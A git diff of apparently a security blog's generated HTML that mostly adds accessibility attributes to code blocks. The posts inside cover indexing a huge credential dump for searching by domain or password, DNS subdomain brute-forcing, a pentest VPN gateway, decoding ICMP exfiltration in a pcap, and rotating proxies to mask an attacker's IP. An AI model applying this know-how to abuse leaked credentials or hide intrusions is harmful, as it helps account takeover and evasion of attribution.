+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Password</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
   has_many <span style="color:#e6db74">:records</span>
@@ -998,7 +1855,7 @@ are all that&rsquo;s needed to enable queries that can ordinarily be cumbersome 
   belongs_to <span style="color:#e6db74">:username</span>
 <span style="color:#66d9ef">end</span>
 </code></pre></div><h3 id="configuring-the-database-driver">Configuring the Database Driver</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
 
 <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span><span style="color:#f92672">.</span>establish_connection( 
  <span style="color:#e6db74">host</span>: <span style="color:#e6db74">&#34;localhost&#34;</span>,
@@ -1010,7 +1867,7 @@ are all that&rsquo;s needed to enable queries that can ordinarily be cumbersome 
 </code></pre></div><h3 id="configuring-the-database-schema">Configuring the Database Schema</h3>
 <p>The following are the schema migrations that will create the correct tables and indices in our
 database, as well as set the constraints necessary to keep our data clean:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>
 
 <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddRecords</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">]</span>
   <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
@@ -1094,7 +1951,7 @@ still help the seed times by leveraging Database Transactions and Postgres' <cod
 though.</p>
 <p>Grouping 7 different transactions into one will ensure that all operations required for adding a
 new dump entry to our tables occur together.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">BEGIN</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">BEGIN</span> 
 
 <span style="color:#66d9ef">WITH</span> ins1 <span style="color:#66d9ef">AS</span> (
         <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> usernames(name) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span>)
@@ -1133,7 +1990,7 @@ have any dangling data in our database.</p>
 <h3 id="querying">Querying</h3>
 <p>Once we create the tables and seed some data, our associations are set in the ORM such that
 pivoting on any instance of a <code>username</code>, <code>password</code>, or <code>domain</code> is possible.</p>
-<pre><code># start with a domain
+<pre tabindex="0"><code># start with a domain
 yahoo = Domain.find_by(domain: &quot;yahoo.com&quot;)
 
 # find all passwords by yahoo mail users
@@ -1171,7 +2028,7 @@ data in an interactive enironment, like so&hellip; <code>records.first.username.
 data.</p>
 <p>The following was all that was needed to create the JSON API server in Ruby. (ruby because that&rsquo;s
 what ActiveRecord is written in)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">get <span style="color:#e6db74">&#39;/domains/:domain&#39;</span> <span style="color:#66d9ef">do</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">get <span style="color:#e6db74">&#39;/domains/:domain&#39;</span> <span style="color:#66d9ef">do</span>
   domain <span style="color:#f92672">=</span> <span style="color:#66d9ef">Domain</span><span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">domain</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:domain</span><span style="color:#f92672">]</span>)
   paginated(domain, params)
 <span style="color:#66d9ef">end</span>
@@ -1261,16 +2118,16 @@ and more duplicate entires in the database. I wish I&rsquo;d kept a count of NON
 report. I&rsquo;m a bad scientist and I feel bad.</p>
 <p>All stats are for files with the <code>txt</code> extension only.</p>
 <p>Original line count</p>
-<pre><code>27,472,858,235
+<pre tabindex="0"><code>27,472,858,235
 </code></pre><p>Listing of the data after being split and uniqued:</p>
-<pre><code>-rw-r--r-- 1 alex alex 296G Nov 27 19:20 usernames.txt
+<pre tabindex="0"><code>-rw-r--r-- 1 alex alex 296G Nov 27 19:20 usernames.txt
 -rw-rw-r-- 1 alex alex  18G Dec  3 11:04 usernames_uniq.txt
 -rw-r--r-- 1 alex alex 260G Nov 27 19:20 domains.txt
 -rw-rw-r-- 1 alex alex 2.3G Dec  2 08:00 domains_uniq.txt
 -rw-r--r-- 1 alex alex 250G Nov 27 19:20 passwords.txt
 -rw-rw-r-- 1 alex alex  16G Dec  1 02:13 passwords_uniq.txt
 </code></pre><p>Line counts of split components pre and post uniquing:</p>
-<pre><code> 27472857767 domains.txt
+<pre tabindex="0"><code> 27472857767 domains.txt
  27472858235 passwords.txt
  27472857744 usernames.txt
 
@@ -1306,7 +2163,7 @@ Skip the bottleneck and craft the DNS packets manually.</p>
 <li><a href="https://github.com/danielmiessler/SecLists">Seclists</a> - Discovery/DNS/subdomains-top1mil-110000.txt</li>
 </ul>
 <p><strong>DNS Resolvers</strong>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">4.2.2.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">4.2.2.1
 1.1.1.1
 8.8.8.8
 64.6.64.6
@@ -1343,7 +2200,7 @@ Skip the bottleneck and craft the DNS packets manually.</p>
 </tr>
 <tr>
 <td>Fernmelder</td>
-<td><code>awk '{print $1&quot;.example.com&quot;}' top110k.txt \| fernmelder -4 -N 4.2.2.1 -N 1.1.1.1 -N 8.8.8.8 -N 64.6.64.6 -N 77.88.8.8 -N 74.82.42.42 -N 4.2.2.2 -N 1.0.0.1 -N 8.8.4.4 -N 4.2.2.3 -N 9.9.9.10 -N 64.6.65.6 -N 77.88.8.1 -N 4.2.2.4 -A</code></td>
+<td><code>awk '{print $1&quot;.example.com&quot;}' top110k.txt | fernmelder -4 -N 4.2.2.1 -N 1.1.1.1 -N 8.8.8.8 -N 64.6.64.6 -N 77.88.8.8 -N 74.82.42.42 -N 4.2.2.2 -N 1.0.0.1 -N 8.8.4.4 -N 4.2.2.3 -N 9.9.9.10 -N 64.6.65.6 -N 77.88.8.1 -N 4.2.2.4 -A</code></td>
 <td><code>3.17s user 10.56s system 6% cpu 3:24.90 total </code></td>
 </tr>
 </tbody>
@@ -1375,7 +2232,7 @@ DNS request packet.</p>
 <p>Looking at the
 <a href="https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619">relevant Amass source code</a>
 , we can see the creation of the request packet in the <code>queryMessage</code> function.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">func</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">uint16</span>, <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">qtype</span> <span style="color:#66d9ef">uint16</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span> {
 	<span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span>{
@@ -1399,7 +2256,7 @@ DNS request packet.</p>
 	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">m</span>
 }
 </code></pre></div><p>This function is called from a Resolver&rsquo;s private <code>writeMessage</code> function. See line 4 below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L261-L275
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L261-L275
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolver</span>) <span style="color:#a6e22e">writeMessage</span>(<span style="color:#a6e22e">co</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Conn</span>, <span style="color:#a6e22e">req</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolveRequest</span>) {
 	<span style="color:#a6e22e">msg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">getID</span>(), <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Name</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Qtype</span>)
@@ -1421,15 +2278,15 @@ job.</p>
 <p>Compare this to SubBrute. Even though SubBrute can operate on multiple threads, it&rsquo;s still bound to
 the eventual calling of the operating system&rsquo;s DNS query mechanism here:</p>
 <p><code>query = dnslib.DNSRecord.question(hostname, query_type.upper().strip())</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://github.com/TheRook/subbrute/blob/master/subbrute.py#L53-L64</span>
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query</span>(self, hostname, query_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ANY&#39;</span>, name_server <span style="color:#f92672">=</span> False, use_tcp <span style="color:#f92672">=</span> False):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://github.com/TheRook/subbrute/blob/master/subbrute.py#L53-L64</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query</span>(self, hostname, query_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ANY&#39;</span>, name_server <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>, use_tcp <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>):
     ret <span style="color:#f92672">=</span> []
-    response <span style="color:#f92672">=</span> None
-    <span style="color:#66d9ef">if</span> name_server <span style="color:#f92672">==</span> False:
+    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+    <span style="color:#66d9ef">if</span> name_server <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
         name_server <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_ns()
     <span style="color:#66d9ef">else</span>:
         self<span style="color:#f92672">.</span>wildcards <span style="color:#f92672">=</span> {}
-        self<span style="color:#f92672">.</span>failed_code <span style="color:#f92672">=</span> None
+        self<span style="color:#f92672">.</span>failed_code <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
     self<span style="color:#f92672">.</span>last_resolver <span style="color:#f92672">=</span> name_server
     query <span style="color:#f92672">=</span> dnslib<span style="color:#f92672">.</span>DNSRecord<span style="color:#f92672">.</span>question(hostname, query_type<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>strip())
     <span style="color:#66d9ef">try</span>:
@@ -1489,21 +2346,21 @@ other network will serve DHCP and internet to any guest OSes that happen to have
 interface assigned by the virtualization software. More on that later.</p>
 <p>Power on the gateway VM.</p>
 <p>Note the output of <code>ip</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show <span style="color:#75715e"># or &#39;ip a s&#39; for short</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show <span style="color:#75715e"># or &#39;ip a s&#39; for short</span>
 </code></pre></div><p>In my case, I can see that <code>ens33</code> is the NAT interface because it pulled DHCP from VMWare&rsquo;s virtual
 network. <code>ens36</code> has no IP because we haven&rsquo;t assigned it one, nor is there a DHCP server on the
 <code>vmnet2</code> network. Continue by installing our dependencies.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
 sudo apt install dnsmasq openvpn iptables-persistent openssh-server
 </code></pre></div><p>SSH in.</p>
 <p>You&rsquo;ll also need an account with a VPN provider that provides <code>*.ovpn</code> files. I&rsquo;ll be going with
 Private Internet Access for this one.</p>
 <p>This engagement requires we be located in Mexico.
 Download the PIA VPN profiles to the gateway:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://www.privateinternetaccess.com/openvpn/openvpn.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://www.privateinternetaccess.com/openvpn/openvpn.zip
 unzip -c openvpn.zip Mexico.ovpn &gt; /etc/openvpn/client/Mexico.ovpn
 </code></pre></div><p>Let&rsquo;s start by configuring the Debian to automatically start the VPN on boot.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
 <span style="color:#75715e">#</span>
 cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.service
 </span><span style="color:#e6db74">[Unit]
@@ -1521,7 +2378,7 @@ cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.se
 </span><span style="color:#e6db74">WantedBy=multi-user.target
 </span><span style="color:#e6db74">FILE</span>
 </code></pre></div><p>Create the <code>up.txt</code> that holds your OpenVPN profile credentials:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create the auth file for autostarting the VPN tunnel</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create the auth file for autostarting the VPN tunnel</span>
 <span style="color:#75715e">#</span>
 cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/openvpn/client/up.txt
 </span><span style="color:#e6db74">${your_ovpn_user}
@@ -1537,10 +2394,10 @@ systemctl enable openvpn.service
 systemctl start openvpn.service
 </code></pre></div><p>At this point, you should have a working VPN connection and a <code>tun0</code> interface when you run <code>ip a s</code>.
 If you&rsquo;re following along, you should get <code>Mexico City</code> when you:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl ipconfig.io/city
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl ipconfig.io/city
 </code></pre></div><p>Next up, we enable IP forwarding on the kernel and set up our DHCP server. Feel free to change the
 IP values so they suit your needs.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
 <span style="color:#75715e">#</span>
 sed -i <span style="color:#e6db74">&#34;/net.ipv4.ip_forward=1/ s/#*//&#34;</span> /etc/sysctl.conf
 
@@ -1569,11 +2426,11 @@ cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/dnsmasq.conf
 </span><span style="color:#e6db74">dhcp-range=192.168.100.100,192.168.100.200,255.255.255.0,24h
 </span><span style="color:#e6db74">FILE</span>
 </code></pre></div><p>Load the interface changes and restart dnsmasq and ensure it&rsquo;s running properly:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifup ens36
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifup ens36
 systemctl restart dnsmasq
 systemctl status dnsmasq
 </code></pre></div><p>One last step, just set and save some <code>iptables</code> rules:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Configure the firewall to redirect packets coming from the client net</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Configure the firewall to redirect packets coming from the client net</span>
 <span style="color:#75715e"># to leave through the VPN interface. Deny all but established</span>
 <span style="color:#75715e"># connections coming from the tun0 interface. Persist the rules.</span>
 <span style="color:#75715e">#</span>
@@ -1639,7 +2496,7 @@ legitimate ICMP echo requests.</p>
 <p>By scanning through the <code>type</code> flags of a few successive packets, we begin to suspect that these
 values might be ASCII codes, given the lower/upper bounds. If we manually take the first 3 codes
 <code>(71, 73, 70)</code> and convert them, we get:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> num in <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">73</span> 70; <span style="color:#66d9ef">do</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">for</span> num in <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">73</span> 70; <span style="color:#66d9ef">do</span> 
   ascii<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%03o&#39;</span> $num<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
   printf <span style="color:#e6db74">&#34;\\</span><span style="color:#e6db74">${</span>ascii<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
 <span style="color:#66d9ef">done</span>
@@ -1649,19 +2506,19 @@ values might be ASCII codes, given the lower/upper bounds. If we manually take t
 decide that switching to a programatic approach might be easier. Python&rsquo;s <code>scapy</code> library is a handy
 packet parsing tool I&rsquo;ve used in the past.</p>
 <p>Let&rsquo;s fire up the iPython REPL and import our tools:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
 pcap <span style="color:#f92672">=</span> rdpcap(<span style="color:#e6db74">&#39;data.pcap&#39;</span>)
 </code></pre></div><p>We&rsquo;re going to want to filter out all of our ICMP packets:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pcap <span style="color:#66d9ef">if</span> ICMP <span style="color:#f92672">in</span> p]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> pcap <span style="color:#66d9ef">if</span> ICMP <span style="color:#f92672">in</span> p]
 </code></pre></div><p><img src="4.png" alt=""></p>
 <p>Since the values used for the <code>type</code> flag span the entire ASCII range, it&rsquo;s a statistical
 probability that this ICMP traffic will send a legitimate ICMP echo request. That means we&rsquo;ll get
 legitimate responses in our PCAP data. We can isolate requests by specifying that we only want ICMP
 packets that are <em>leaving</em> a particular source.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets <span style="color:#66d9ef">if</span> p[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;10.136.255.127&#39;</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">packets <span style="color:#f92672">=</span> [p <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets <span style="color:#66d9ef">if</span> p[IP]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;10.136.255.127&#39;</span>]
 </code></pre></div><p>Now we have a handle on all ICMP traffic leaving 10.136.255.127. The next step is to convert
 everything from ASCII codes to their corresponding characters and write to disk.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># take type flag of each packet</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># take type flag of each packet</span>
 ascii <span style="color:#f92672">=</span> [p[ICMP]<span style="color:#f92672">.</span>type <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> packets]
 
 <span style="color:#75715e"># convert them to character string</span>
@@ -1672,11 +2529,11 @@ data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;
 <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;mystery.file&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
     f<span style="color:#f92672">.</span>write(data)
 </code></pre></div><p>What exactly is this file?</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">file mystery.file
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">file mystery.file
 </code></pre></div><p><img src="5.png" alt=""></p>
 <p>And we have our data. If we want to go back and clean up some of the code and make it somewhat
 reusable&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> IP, ICMP, rdpcap
 
 FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;data.pcap&#39;</span>
 SOURCE_IP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.136.255.127&#39;</span>
@@ -1703,7 +2560,7 @@ it would be difficult to tell where one file ends and another begins. In this ex
 could help us extract the multiple files.</p>
 <p>To simulate this scenario, add the following line to our script, just before with write-to-disk
 operation:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> data <span style="color:#f92672">+</span> data
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">data <span style="color:#f92672">=</span> data <span style="color:#f92672">+</span> data <span style="color:#f92672">+</span> data
 </code></pre></div><p>After running the python file again, we can run the resulting file through binwalk.</p>
 <p><img src="6.png" alt=""></p>
 <p>Binwalk was able to find 3 distinct files embedded in the dumped data from our script.</p>
@@ -1731,10 +2588,10 @@ collection of OpenVPN config files to create local proxies on localhost. In comb
 like proxychains or DoxyCannon&rsquo;s own DoxyProxy, you can shuffle through local proxies for each
 request, masking the true IP of the attacking machine.</p>
 <p>Let&rsquo;s see what this looks like on the receiving end. First, let&rsquo;s set up DoxyCannon.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/audibleblink/doxycannon
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/audibleblink/doxycannon
 cd doxycannon
 </code></pre></div><p>We&rsquo;re going to using Private Internet Access as our VPN provider.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wget  https://www.privateinternetaccess.com/openvpn/openvpn.zip
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wget  https://www.privateinternetaccess.com/openvpn/openvpn.zip
 unzip -d VPN openvpn.zip
 
 <span style="color:#75715e"># Remove whitespace from the ovpn file names</span>
@@ -1749,7 +2606,7 @@ echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</spa
 <a href="001.jpg"><img src="001.jpg" alt=""></a></p>
 <p>At this point, DoxyCannon has dynamically created a <code>proxychains.conf</code> file for you in the root of
 the project directory:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#75715e"># proxychains.conf</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#75715e"># proxychains.conf</span>
 <span style="color:#75715e"># ------------------------------------------------------------------------</span>
